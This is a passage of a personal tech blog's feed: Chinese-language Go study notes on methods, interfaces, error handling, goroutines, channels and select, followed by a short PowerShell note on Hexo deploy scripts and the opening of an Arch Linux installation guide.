fmt.Println(p2.getName())    fmt.Println(d1.getDoorStatus())&#125;</code></pre><p>方法和普通的函数唯一的区别就是方法默认指定了第一个参数并把它放到了函数名前面，上面的<code>getName</code>方法就等同于下面的<code>getName</code>函数：</p><pre><code class="go">func getName(p Person) string &#123;    return p.name&#125;func main() &#123;    p1 := Person&#123;&quot;Tom&quot;, 12&#125;    fmt.Println(getName(p1))&#125;</code></pre><h4 id="指针接收者"><a href="#指针接收者" class="headerlink" title="指针接收者"></a>指针接收者</h4><p>不使用指针接收者的情况下，传入的只是变量的拷贝，并不会对变量本身进行修改，使用指针接收者能够传递变量指针直接修改变量值：</p><pre><code class="go">type person struct &#123;    name string    age  int&#125;func (p person) SetName(name string) &#123;    p.name = name&#125;func (p *person) SetRealName(name string) &#123;    p.name = name&#125;func main() &#123;    p := person&#123;&quot;Jack&quot;, 12&#125;    p.SetName(&quot;Tom&quot;)    fmt.Println(p) // &#123;Jack 12&#125;    p.SetRealName(&quot;Tom&quot;)    fmt.Println(p) // &#123;Tom 12&#125;&#125;</code></pre><p>上述的代码等同于：</p><pre><code class="go">type person struct &#123;    name string    age  int&#125;func SetName(p person, name string) &#123;    p.name = name&#125;func SetRealName(p *person, name string) &#123;    p.name = name&#125;func main() &#123;    p := person&#123;&quot;Jack&quot;, 12&#125;    SetName(p, &quot;Tom&quot;)    fmt.Println(p) // &#123;Jack 12&#125;    SetRealName(&amp;p, &quot;Tom&quot;)    fmt.Println(p) // &#123;Tom 12&#125;&#125;</code></pre><p>可以注意到使用指针接收者的情况下，上述代码调用方法时使用的是<code>p.SetRealName</code>而非<code>(&amp;p).SetRealName</code>，而在等价的函数中，必须传入变量<code>p</code>的地址。这是 Golang 提供的便利用法，在调用为指针接收者的方法时，会自动将<code>p.SetRealName</code>解释为<code>(&amp;p).SetRealName</code>，因此二者是等价的。</p><p>函数和方法还有以下差别：</p><pre><code class="go">func (p person) setName(name string) &#123;    p.name = name&#125;func setName(p person, name string) &#123;    p.name = name&#125;func main() &#123;    p := person&#123;&quot;Jack&quot;, 12&#125;    p.setName(&quot;Tom&quot;)    fmt.Println(p) // &#123;Jack 12&#125;    (&amp;p1).setName(&quot;Tom&quot;)    fmt.Println(p) // &#123;Jack 12&#125;    setName(p, &quot;Tom&quot;)    fmt.Println(p) // &#123;Jack 12&#125;       setName(p, &quot;Tom&quot;) // Compile error    fmt.Println(p)&#125;</code></pre><p>可以注意到对于非指针接收者方法，仍然可以使用<code>(&amp;p)</code>传入，然而对于不接受指针参数的函数使用指针，则不能通过编译。</p><p>使用指针接收者的目的主要有两个：</p><ol><li>使该方法可以修改其接收者指向的值</li><li>避免在每个方法上复制被操作变量的值</li></ol><p>第二点在大型项目中尤为重要，当某一个类型有大量的方法时，不使用指针接收者会导致调用每个方法都需要复制一份该类型的变量值。</p><h4 id="嵌入结构体"><a href="#嵌入结构体" class="headerlink" title="嵌入结构体"></a>嵌入结构体</h4><p>通过嵌入匿名结构体的方式能够继承这些匿名结构体的方法，从而实现 OOP 的继承特性：</p><pre><code class="go">type Person struct &#123;    Name string    Age  int&#125;type Student struct &#123;    Person    Class string&#125;func (p *Person) SetName(name string) &#123;    p.Name = name&#125;func (s *Student) SetClass(class string) &#123;    s.Class = class&#125;func main() &#123;    s := &amp;Student&#123;&#125;    s.SetName(&quot;John&quot;)    s.SetClass(&quot;class-1&quot;)    fmt.Println(s)    // &amp;&#123;&#123;John 0&#125; class-1&#125;&#125;</code></pre><h4 id="方法值-amp-方法表达式"><a href="#方法值-amp-方法表达式" class="headerlink" title="方法值&amp;方法表达式"></a>方法值&amp;方法表达式</h4><p>方法和函数一样能够作为值传递给变量或作为参数传递给函数/方法：</p><pre><code class="go">func main() &#123;    p := &amp;Person&#123;&#125;    setName := p.SetName    setName(&quot;John&quot;)    fmt.Println(p)    // &amp;&#123;John 0&#125;&#125;</code></pre><p>使用类型而不是该类型的实例作为接收者，同样能够调用，比如使用<code>*T</code>：</p><pre><code class="go">func main() &#123;    p := &amp;Person&#123;&#125;    (*Person).SetName(p, &quot;John&quot;)    fmt.Println(p)    // &amp;&#123;John 0&#125;&#125;</code></pre><p>这被称为方法表达式。可以看到原本只能接收一个参数的<code>SetName</code>函数现在还可以接收一个其接收者类型的变量，也就是说当使用方法表达式时，接收者作为第一个参数传给方法，它现在和普通函数的用法相同了。</p><p>同样的，使用<code>T</code>：</p><pre><code class="go">func (p Person) SetName(name string) &#123;    p.Name = name&#125;func main() &#123;    p := Person&#123;&#125;    Person.SetName(p, &quot;John&quot;)    fmt.Println(p)    // &#123; 0&#125;&#125;</code></pre><p>使用非指针接收者的时候<code>SetName</code>修改的是<code>p</code>的拷贝，因此并没有修改<code>p</code>的字段值。</p><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>接口（Interface）定义为一组方法的签名。</p><p>接口类型的值可以包含实现那些方法的任何值。</p><pre><code class="go">// Sender 接口type Sender interface &#123;    Send()    From()&#125;type message struct &#123;    msg  string    from string&#125;type mail struct &#123;    msg  string    from string    to   string&#125;func (m *message) Send() &#123;    fmt.Println(&quot;已发送&quot;, m.msg)&#125;func (m *message) From() &#123;    fmt.Println(&quot;发送者&quot;, m.from)&#125;func main() &#123;    var s Sender    s = &amp;message&#123;        msg:  &quot;你好&quot;,        from: &quot;Tom&quot;,    &#125;    s.Send() // 已发送 你好    s.From() // 发送者 Tom&#125;</code></pre><p>上述代码中定义了一个接口<code>Sender</code>，两个结构体<code>message</code>和<code>mail</code>，其中<code>message</code>有两个方法<code>Send</code>和<code>From，因此</code>message<code>实现了</code>Sender`接口。</p><p>接口可以接收实现它的类型的值，因此可以将<code>&amp;message&#123;&#125;</code>赋值给接口变量<code>s</code>，这个变量可以操作其定义的所有方法。当有其他类型实现这个接口时也是同样的操作。</p><h4 id="隐式实现"><a href="#隐式实现" class="headerlink" title="隐式实现"></a>隐式实现</h4><p>Golang 中接口的实现是隐式的，而不是某些语言中显式的实现（如 Java 中的<code>inplements</code>关键字），隐式实现能让定义的接口与其实现取消关联：</p><pre><code class="go">type I interface &#123;    M()&#125;type T struct &#123;    S string&#125;func (t T) M() &#123;    fmt.Println(t.S)&#125;func main() &#123;    var i I = T&#123;&quot;hello&quot;&#125;    i.M()&#125;</code></pre><p>可以看到上述代码中因为<code>T</code>有一个方法<code>M</code>而自动隐式实现了接口<code>I</code>，这其中并未有显式的声明。</p><h4 id="接口的值"><a href="#接口的值" class="headerlink" title="接口的值"></a>接口的值</h4><p>接口的值（interface values）可以看作一个值和该值具体类型的二元组，即<code>(value, type)</code>，我们在关于接口的第一段代码中加入一行：</p><pre><code class="go">func main() &#123;    var s Sender    s = &amp;message&#123;        msg:  &quot;你好&quot;,        from: &quot;Tom&quot;,    &#125;    s.Send()    s.From()    // 加入下面一行    fmt.Printf(&quot;%v %T&quot;, s, s) // &amp;&#123;你好 Tom&#125; *main.message&#125;</code></pre><p>可以看到输出了这个接口值的类型。也就是说，调用这个接口底下的方法就是调用其值的同名方法，即：</p><pre><code class="go">var s Sendervar m = message&#123;    msg:  &quot;你好&quot;,    from: &quot;Tom&quot;,&#125;s = &amp;m// 下面两句代码的输出相同s.Send() // 已发送  你好m.Send() // 已发送  你好</code></pre><h4 id="内部值为-nil-的接口"><a href="#内部值为-nil-的接口" class="headerlink" title="内部值为 nil 的接口"></a>内部值为 nil 的接口</h4><p>当赋给接口变量的是一个为 nil 的具体类型的值时，接口的方法会调用为接收者是 nil 的方法：</p><pre><code class="go">type Sender interface &#123;    Send()&#125;type message struct &#123;    msg  string&#125;func (m *message) Send() &#123;    if m == nil &#123;        fmt.Println(&quot;NIL&quot;)        return    &#125;&#125;func main() &#123;    var s Sender    var m *message // nil    s = m    s.Send() // NIL    fmt.Printf(&quot;%v %T&quot;, s, s) // &lt;nil&gt; *main.message&#125;</code></pre><p>在 Golang 中这样使用并不会报错。要注意的是，接口变量包含的值为 nil，但接口本身是非 nil 的值，比如其中还包含值类型。</p><h4 id="值为-nil-的接口"><a href="#值为-nil-的接口" class="headerlink" title="值为 nil 的接口"></a>值为 nil 的接口</h4><p>前面一节说的是接口内存储的类型值为 nil 的情况，而这一节就说的是接口本身为 nil 的情况：</p><pre><code class="go">func main() &#123;    var s Sender    s.Send()&#125;// panic: runtime error: invalid memory address or nil pointer dereference</code></pre><p>上面的代码会报错，这是因为为 nil 的接口没有包含任何类型，也就没有办法去调用这些类型的方法。</p><h4 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h4><p>空接口是一个很常用的东西，不包含任何方法签名的接口叫做空接口：</p><pre><code class="go">type i interface&#123;&#125;</code></pre><p>空接口可以包含任何类型，因此它常用于处理未知类型的变量，我们可以从<code>fmt.Println</code>函数了解它的用法：</p><pre><code class="go">// Println formats using the default formats for its operands and writes to standard output.// Spaces are always added between operands and a newline is appended.// It returns the number of bytes written and any write error encountered.func Println(a ...interface&#123;&#125;) (n int, err error) &#123;    return Fprintln(os.Stdout, a...)&#125;</code></pre><p>可以看到标准库中的<code>fmt.Println</code>函数接收多个类型为<code>interface&#123;&#125;</code>的值，然后我们往下寻找程序代码中具体处理<code>interface&#123;&#125;</code>类型变量的代码：</p><pre><code class="go">// Some types can be done without reflection.switch f := arg.(type) &#123;case bool:    p.fmtBool(f, verb)case float32:    p.fmtFloat(float64(f), 32, verb)case float64:    p.fmtFloat(f, 64, verb)case complex64:    p.fmtComplex(complex128(f), 64, verb)case complex128:    p.fmtComplex(f, 128, verb)case int:    p.fmtInteger(uint64(f), signed, verb)case int8:    p.fmtInteger(uint64(f), signed, verb)case int16:    p.fmtInteger(uint64(f), signed, verb)case int32:    p.fmtInteger(uint64(f), signed, verb)case int64:    p.fmtInteger(uint64(f), signed, verb)case uint:    p.fmtInteger(uint64(f), unsigned, verb)case uint8:    p.fmtInteger(uint64(f), unsigned, verb)case uint16:    p.fmtInteger(uint64(f), unsigned, verb)case uint32:    p.fmtInteger(uint64(f), unsigned, verb)case uint64:    p.fmtInteger(f, unsigned, verb)case uintptr:    p.fmtInteger(uint64(f), unsigned, verb)case string:    p.fmtString(f, verb)case []byte:    p.fmtBytes(f, verb, &quot;[]byte&quot;)case reflect.Value:    // Handle extractable values with special methods    // since printValue does not handle them at depth 0.    if f.IsValid() &amp;&amp; f.CanInterface() &#123;        p.arg = f.Interface()        if p.handleMethods(verb) &#123;            return        &#125;    &#125;    p.printValue(f, verb, 0)default:    // If the type is not simple, it might have methods.    if !p.handleMethods(verb) &#123;        // Need to use reflection, since the type had no        // interface methods that could be used for formatting.        p.printValue(reflect.ValueOf(f), verb, 0)    &#125;&#125;</code></pre><p>可以看到上述代码使用了复杂的<code>switch</code>语句来枚举每一种类型的情况，从而最终实现对不同类型的输出（这其中使用了类型断言，后面会讲到）。这样的写法是由于 Golang 中没有泛型导致的（在将来的版本更新中或许会加入）。</p><h4 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h4><p>类型断言（Type Assertions）用于获取接口内部值和值类型，当类型匹配时则无错误：</p><pre><code class="go">func main() &#123;    var i interface&#123;&#125;    i = 12 // int    t := i.(int) // int 匹配 int    fmt.Println(t) // 12&#125;</code></pre><p>当类型不匹配时程序直接报错：</p><pre><code class="go">var i interface&#123;&#125;i = 12 // intt := i.(string) // string 不匹配 intfmt.Println(t)// panic: interface conversion: interface &#123;&#125; is int, not string</code></pre><p>类型断言只能应用于接口变量，不能用于其他类型变量：</p><pre><code class="go">var i inti = 12 // intt := i.(int)fmt.Println(t)// invalid type assertion: i.(int) (non-interface type int on left)</code></pre><p>可以使用两个左值来进行类型判断，即便断言失败也不会引发<code>panic</code>：</p><pre><code class="go">t, ok := v.(T) // T 指代类型</code></pre><p>当类型匹配时<code>ok</code>为<code>true</code>，否则为<code>false</code>，可以实现下面的代码：</p><pre><code class="go">func main() &#123;    var iSlice = []interface&#123;&#125;&#123;        &quot;string&quot;,        12,        nil,        int64(12),    &#125;    for _, v := range iSlice &#123;        if t, ok := v.(string); ok &#123;            fmt.Printf(&quot;true: %v %T\n&quot;, t, t)        &#125;else&#123;            fmt.Printf(&quot;false: %v %T\n&quot;, t, t)        &#125;    &#125;&#125;// true: string string// false:  string// false:  string// false:  string</code></pre><p>可以看到，当断言失败的时候，左值<code>t</code>的类型变为了断言类型<code>T</code>，其值变为了该类型的零值。</p><h4 id="类型-Switch"><a href="#类型-Switch" class="headerlink" title="类型 Switch"></a>类型 Switch</h4><p>在前面的空接口小节中有提到，<code>fmt.Println()</code>最终实现不同类型的处理使用的是类型断言，并且采用了<code>switch</code>语句进行区分，具体参考前面的代码。</p><h4 id="Stringers"><a href="#Stringers" class="headerlink" title="Stringers"></a>Stringers</h4><p><code>fmt</code>包定义了一个<code>Stringer</code>接口，这是一个很特殊的接口：</p><pre><code class="go">type Stringer interface &#123;    String() string&#125;</code></pre><p>这个接口可以将其本身描述为一个字符串，很多包都使用了这个接口来输出值：</p><pre><code class="go">type Person struct &#123;    name string    age  int&#125;func (p *Person) String() string &#123;    return fmt.Sprintln(p.name, p.age)&#125;func main() &#123;    var p1 = &amp;Person&#123;&quot;Tom&quot;, 12&#125;    var p2 = &amp;Person&#123;&quot;Jack&quot;, 11&#125;    fmt.Printf(&quot;%v%v&quot;, p1, p2)&#125;// Tom 12// Jack 11</code></pre><p>可以看到无需显式调用，<code>String</code>方法就自动被调用了，我们修改一下方法名：</p><pre><code class="go">type Person struct &#123;    name string    age  int&#125;func (p *Person) Format() string &#123;    return fmt.Sprintln(p.name, p.age)&#125;func main() &#123;    var p1 = &amp;Person&#123;&quot;Tom&quot;, 12&#125;    var p2 = &amp;Person&#123;&quot;Jack&quot;, 11&#125;    fmt.Printf(&quot;%v%v&quot;, p1, p2)&#125;// &amp;&#123;Tom 12&#125;&amp;&#123;Jack 11&#125;</code></pre><p>上述代码并没有调用<code>Format</code>方法。</p><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p>Golang 的错误处理非常的丑，至少我是这么认为的 ㄟ( ▔, ▔ )ㄏ。</p><p>内建的<code>error</code>接口用于保存错误：</p><pre><code class="go">type error interface &#123;    Error() string&#125;</code></pre><p>参考<code>Stringers</code>，<code>fmt</code>包也会去寻找<code>error</code>接口并调用它的<code>Error</code>方法：</p><pre><code class="go">type MyError struct &#123;    When string    What string&#125;func (e *MyError) Error() string &#123;    return fmt.Sprintf(&quot;At %s, %s&quot;,        e.When, e.What)&#125;func run() error &#123;    return &amp;MyError&#123;        time.Now().Format(&quot;2006-01-02&quot;),        &quot;it didn&#39;t work&quot;,    &#125;&#125;func main() &#123;    if err := run(); err != nil &#123;        fmt.Println(err) // At 2021-04-23, it didn&#39;t work    &#125;&#125;</code></pre><p>Golang 中大量使用<code>if err != nil</code>这样的错误处理方式：</p><pre><code class="go">err := handleError() // return error typeif err != nil &#123;    fmt.Println(err) // 输出错误&#125;fmt.Println(&quot;没有错误&quot;)</code></pre><h3 id="Readers"><a href="#Readers" class="headerlink" title="Readers"></a>Readers</h3><p>标准库中的<code>io</code>包定义了一个接口<code>io.Reader</code>，它用于表示数据流的读取端。</p><p>Golang 标准库中有许多对这个接口的实现，包括文件处理、网络连接、压缩器、密码相关等等。</p><p><code>io.Reader</code>接口有一个<code>Read</code>方法：</p><pre><code class="go">func (T) Read(b []byte) (n int, err error)</code></pre><p><code>Read</code>方法往传入的字节切片中填入数据，并返回填充的字节数和一个错误值，当它读到字节流的末端时会传回一个<code>io.EOF</code>错误。</p><p>参考示例代码：</p><pre><code class="go">func main() &#123;    r := strings.NewReader(&quot;Hello, Reader!&quot;)    b := make([]byte, 8)    for &#123;        n, err := r.Read(b)        fmt.Printf(&quot;n = %v err = %v b = %v\n&quot;, n, err, b)        fmt.Printf(&quot;b[:n] = %q\n&quot;, b[:n])        if err == io.EOF &#123;            break        &#125;    &#125;&#125;// n = 8 err = &lt;nil&gt; b = [72 101 108 108 111 44 32 82]// b[:n] = &quot;Hello, R&quot;// n = 6 err = &lt;nil&gt; b = [101 97 100 101 114 33 32 82]// b[:n] = &quot;eader!&quot;// n = 0 err = EOF b = [101 97 100 101 114 33 32 82]// b[:n] = &quot;&quot;</code></pre><p>上面的代码中，<code>strings.NewReader</code>方法生成了一个<code>strings.Reader</code>结构体，其内部字符串值为<code>&quot;Hello, Reader!&quot;</code>，并将其赋值给变量<code>r</code>。另外有一个 8 字节长度的字节切片<code>b</code>。</p><p><code>for</code>循环体中，<code>Read</code>方法读取<code>r</code>的内容将其写到<code>b</code>中，并传回写入的字节长度给<code>n</code>。并且，它每次读取<code>r</code>的值后都会记录读取结束的位置，当下一次调用时就会从上次结束的位置开始读取。</p><p><code>for</code>循环每次循环都会重复以上步骤，但由于<code>b</code>的容量只有 8 字节，因此每次最多只能读入 8 个字节的内容给<code>b</code>。当读到<code>r</code>的数据末尾时，则返回<code>io.EOF</code>错误。</p><p>另外注意上面的代码，字节切片<code>b</code>在<code>Read</code>方法中被修改了值，这就是因为切片类型只是对底层数组的引用，虽然传入<code>Read</code>方法内的切片和<code>b</code>不同，但它们的底层数组相同，因此改其一另一个也会被改变。</p><h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><p>并发指的是多个任务在同一时间内一起执行，注意是同一时间内而不是同一时刻。并行是多个任务在同一时刻同时执行，这需要硬件上支持并行，而并发则是让多个任务在极短的时间内快速切换执行，从而达到伪并行的效果。</p><h3 id="Goroutines"><a href="#Goroutines" class="headerlink" title="Goroutines"></a>Goroutines</h3><p>Goroutine 是由 Go runtime 管理的轻量级线程，使用<code>go</code>关键字创建：</p><pre><code class="go">func main() &#123;    for i := 0; i &lt; 10; i++ &#123;        go run(i)    &#125;&#125;func run(i int) &#123;    fmt.Print(i)&#125;</code></pre><p>上面的程序没有返回任何信息，这是因为<code>main</code>函数同样也是一个 Goroutine，其中的循环创建了多个新的 Goroutine，但还没等这些 Goroutine 运行<code>main</code>函数就先运行结束了，因此整个程序都结束了。</p><p>为了避免上述情况，最简单的方法是使用<code>time.Sleep</code>函数让<code>main</code>函数等待其他 Goroutine 运行完：</p><pre><code class="go">func main() &#123;    for i := 0; i &lt; 10; i++ &#123;        go run(i)    &#125;    time.Sleep(2 * time.Second)&#125;func run(i int) &#123;    fmt.Print(i)&#125;// 9183467502</code></pre><p>输出的结果每次都是不一样的，这是因为这些 Goroutine 并发执行，其顺序完全由调度器决定，并不唯一确定。</p><h3 id="Channels"><a href="#Channels" class="headerlink" title="Channels"></a>Channels</h3><p>Channels （中文一般称<strong>通道</strong>）是一种定义了类型的管道，可以往里面发送和接收值。</p><p>发送：</p><pre><code class="go">ch &lt;- value // 将value的值发送到channel ch中</code></pre><p>接收：</p><pre><code class="go">value := &lt;- ch // 接收channel ch的值并为value初始化</code></pre><p>数据按照箭头的方向流动，只有<code>&lt;-</code>这一个操作符。</p><p>和 Map 以及切片一样，通道必须在使用前被创建：</p><pre><code class="go">ch := make(chan int) // channel of int</code></pre><p>默认情况下，Channel 的发送和接收操作在其中一端未就绪时会被阻塞：</p><pre><code class="go">func main() &#123;    ch := make(chan string)    go push(ch)    fmt.Println(&lt;-ch) // 延迟输出了 abc&#125;func push(ch chan string) &#123;    time.Sleep(3 * time.Second)    ch &lt;- &quot;abc&quot;&#125;</code></pre><p>上面的程序中，<code>push</code>函数在三秒后往 Channel 内写入字符串<code>abc</code>，因此在这段时间内 Channel 的接收者一直处于阻塞状态直到 Channel 中有值。同样地，当接收者未就绪时发送者也会阻塞。</p><p>通过这个特性可以很好地对并发执行顺序进行管理，下面的代码就解决了前面并发执行输出结果顺序不定的问题：</p><pre><code class="go">func main() &#123;    ch := make(chan int)    go add(ch)    for i := 0; i &lt; 10; i++ &#123;        fmt.Print(&lt;-ch)    &#125;&#125;func add(ch chan int) &#123;    for i := 0; i &lt; 10; i++ &#123;        ch &lt;- i    &#125;&#125;// 0123456789</code></pre><h4 id="带缓冲区的-Channel"><a href="#带缓冲区的-Channel" class="headerlink" title="带缓冲区的 Channel"></a>带缓冲区的 Channel</h4><p>Channel 创建时默认是不带缓冲区的，也就是前面说的接收端和发送端必须都就绪的原因，然而可以选择创建带缓冲区的 Channel 在不同场景下解决某些问题：</p><pre><code class="go">func main() &#123;    ch := make(chan int, 10)    go add(ch)    time.Sleep(3 * time.Second)    for i := 0; i &lt; 10; i++ &#123;        fmt.Print(&lt;-ch)    &#125;&#125;func add(ch chan int) &#123;    for i := 0; i &lt; 10; i++ &#123;        ch &lt;- i    &#125;    fmt.Println(&quot;Completed!&quot;)&#125;// Completed!// 0123456789</code></pre><p>程序的输出中，后一行要晚出现几秒，这时候 Channel 内已经有 10 个元素了。再看一下不带缓冲区的 Channel：</p><pre><code class="go">func main() &#123;    ch := make(chan int)    go add(ch)    time.Sleep(3 * time.Second)    for i := 0; i &lt; 10; i++ &#123;        fmt.Print(&lt;-ch)    &#125;&#125;func add(ch chan int) &#123;    for i := 0; i &lt; 10; i++ &#123;        ch &lt;- i    &#125;    fmt.Println(&quot;Completed!&quot;)&#125;// 0123456789Completed! 或 0123456789</code></pre><p>不带缓冲区的 Channel 发送和接收必须同时进行，因此<code>add</code>函数只能等待<code>main</code>函数休眠结束接收数据。而当最后一次循环结束后，<code>main</code>函数立即退出，如果在此之前<code>fmt.Println(&quot;Completed!&quot;)</code>没能执行的话，程序的输出结果就不包含*Completed!*了。</p><p>这里有一个地方要注意，并发执行的程序当缓冲区装满时，接收者会先将其中的元素全部接收，然后再对其进行发送操作，直到全部数据元素操作完毕。</p><p>在顺序执行的单个 Goroutine 中，往满 Channel 里写入元素会直接报错：</p><pre><code class="go">func main() &#123;    ch := make(chan int) // 等同于make(chan int, 0)    ch &lt;- 1    fmt.Println(&lt;-ch)&#125;// fatal error: all goroutines are asleep - deadlock!</code></pre><h4 id="Channel-的关闭"><a href="#Channel-的关闭" class="headerlink" title="Channel 的关闭"></a>Channel 的关闭</h4><p>发送者可以使用<code>close</code>函数关闭一个 Channel 来表示这个 Channel 不再有值被传入，接收者也可以知道 Channel 是否关闭：</p><pre><code class="go">func main() &#123;    ch := make(chan int, 10)    go push(ch)    for i := 0; i &lt; 10; i++ &#123;        if v, ok := &lt;-ch; ok &#123;            fmt.Print(v)        &#125;    &#125;&#125;func push(ch chan int) &#123;    for i := 0; i &lt; 10; i++ &#123;        if i == 5 &#123;            close(ch)            break        &#125;        ch &lt;- i    &#125;&#125;// 01234</code></pre><p>注意，只有发送者可以关闭 Channel，对已被关闭的 Channel 进行发送操作会引发<code>panic</code>，但对关闭的 Channel 进行接收不会，接收已关闭的 Channel 只会得到类型零值：</p><pre><code class="go">func main() &#123;    ch := make(chan int)    go push(ch)    for i := 0; i &lt; 10; i++ &#123;        fmt.Print(&lt;-ch)    &#125;&#125;func push(ch chan int) &#123;    for i := 0; i &lt; 10; i++ &#123;        if i == 5 &#123;            close(ch)            break        &#125;        ch &lt;- i    &#125;&#125;// 0123400000</code></pre><p>Close 操作用于告知接收者无值可传，是非必须的操作，与 I/O 操作中的 Close 释放资源并不相似。</p><h4 id="Channel-的-range-操作"><a href="#Channel-的-range-操作" class="headerlink" title="Channel 的 range 操作"></a>Channel 的 range 操作</h4><p><code>for i := range ch</code>语句能够接收 Channel 中的值直到 Channel 被关闭：</p><pre><code class="go">func main() &#123;    ch := make(chan int, 10)    go push(ch)    for i := range ch &#123;        fmt.Print(i)    &#125;&#125;// 01234</code></pre><h3 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h3><p><code>select</code>语句可以让一个 Goroutine 等待多个通信操作：</p><pre><code class="go">func main() &#123;    ch := make(chan int)    signal := make(chan int)    go input(ch, signal)    for &#123;        select &#123;        case v := &lt;-ch:            fmt.Printf(&quot;%d &quot;, v)        case &lt;-signal:            fmt.Print(&quot;Done&quot;)            return        &#125;    &#125;&#125;func input(ch, sig chan int) &#123;    for i := 0; i &lt; 10; i++ &#123;        ch &lt;- i        if i == 5 &#123;            sig &lt;- 0            break        &#125;    &#125;&#125;// 0 1 2 3 4 5 Done</code></pre><p>可以设置<code>default</code>关键字用于设置无接收时的输出：</p><pre><code class="go">func main() &#123;    tick := time.Tick(100 * time.Millisecond)    boom := time.After(500 * time.Millisecond)    for &#123;        select &#123;        case &lt;-tick:            fmt.Print(&quot;tick&quot;)        case &lt;-boom:            fmt.Print(&quot;BOOM!&quot;)            return        default:            fmt.Print(&quot;.&quot;)            time.Sleep(50 * time.Millisecond)        &#125;    &#125;&#125;// ..tick..tick.tick..tick..BOOM!</code></pre><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li>变量作用域</li><li>斐波那契闭包</li><li>Readers 练习</li><li>Images</li><li>等价二叉树练习</li></ul>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;本文是 Golang 的基础学习笔记，大多是对 &lt;a href=&quot;https://tour.golang.org/&quot;&gt;&lt;em&gt;A Tour of Go&lt;/em&gt;&lt;/a&gt; 的翻译总结，并参考了 &lt;a href=&quot;http://www.gopl.io/&quot;&gt;&lt;em&gt;The Go Programming Language&lt;/em&gt;&lt;/a&gt; 的部分内容自行实现了相关代码并对知识点进行了梳理。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="Go" scheme="https://blog.secriy.com/tags/Go/"/>
    
    <category term="PL" scheme="https://blog.secriy.com/tags/PL/"/>
    
  </entry>
  
  <entry>
    <title>PowerShell 食用笔记</title>
    <link href="https://blog.secriy.com/powershell-note/"/>
    <id>https://blog.secriy.com/powershell-note/</id>
    <published>2020-08-23T18:40:18.000Z</published>
    <updated>2025-02-16T07:13:36.780Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>PowerShell 的操作。</p></div><span id="more"></span><h2 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h2><p>PowerShel 脚本实际很强大，平时可以用来执行一系列指令，蛮方便的。</p><p>例如 Hexo 的提交，可以在 Hexo 目录创建一个名为 <em>deploy.ps1</em> 的文件，写入如下命令：</p><pre><code class="powershell">hexo cleanhexo ghexo d</code></pre><p>这样就完成了 Hexo 的提交操作。</p><p>另外，每次手动打开 Hexo 目录下的文章很是麻烦，可以在 Hexo 目录下创建名为 <em>edit.ps1</em> 的文件，写入如下命令：</p><pre><code class="powershell">typora .\source\_posts</code></pre><p>这样直接运行脚本就能以 Typora 打开整个文章文件夹，当然<strong>首先要把 Typora 目录加入到 Windows 环境变量中</strong>。</p><p>但是这样写有一点不好，当关闭终端的时候，Typora 也会跟着关闭，因为 Typora 是从终端启动的，并会取得程序的输出。另外处于同样的原因，终端不再接受命令执行，只有 Ctrl+C 终止任务，如下图。</p><p><img src="/powershell-note/image-20200824025602301.png" class="lazyload" data-srcset="/powershell-note/image-20200824025602301.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200824025602301"></p><p>然而我连这个步骤都不想干，于是找了个完美的办法——屏蔽输出结果。</p><p>修改如下：</p><pre><code class="powershell">$null = typora .\source\_posts</code></pre><p>这样程序执行的输出就不会在终端里显示了，完美解决以上问题。</p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;PowerShell 的操作。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="操作手册" scheme="https://blog.secriy.com/categories/manual/"/>
    
    
    <category term="Windows" scheme="https://blog.secriy.com/tags/Windows/"/>
    
    <category term="Powershell" scheme="https://blog.secriy.com/tags/Powershell/"/>
    
  </entry>
  
  <entry>
    <title>Arch Linux 折腾笔记</title>
    <link href="https://blog.secriy.com/start-with-arch/"/>
    <id>https://blog.secriy.com/start-with-arch/</id>
    <published>2020-07-30T02:29:44.000Z</published>
    <updated>2025-02-16T07:13:36.729Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>装完系统累死我了，淦！</p></div><span id="more"></span><h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li><p><a href="https://www.archlinux.org/download/">镜像</a></p><p>页面中有国内镜像下载方式</p><p><img src="/start-with-arch/image-20200730104226652.png" class="lazyload" data-srcset="/start-with-arch/image-20200730104226652.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li><li><p>U 盘</p></li></ul><h3 id="写入镜像"><a href="#写入镜像" class="headerlink" title="写入镜像"></a>写入镜像</h3><p>本次使用 U 盘写入，并且由于我电脑已经存在 Manjaro，决定直接用 Manjaro 写入镜像。</p><p>如果使用 Windows 写入，参照 <a href="/start-with-manjaro/" title="Manjaro 环境搭建">Manjaro 环境搭建</a> 操作。</p><pre><code class="shell">sudo dd bs=4M if=/path/to/archlinux.iso of=/dev/sdx status=progress &amp;&amp; sync# sdx为U盘位置，自行更改</code></pre><h3 id="安装前的配置"><a href="#安装前的配置" 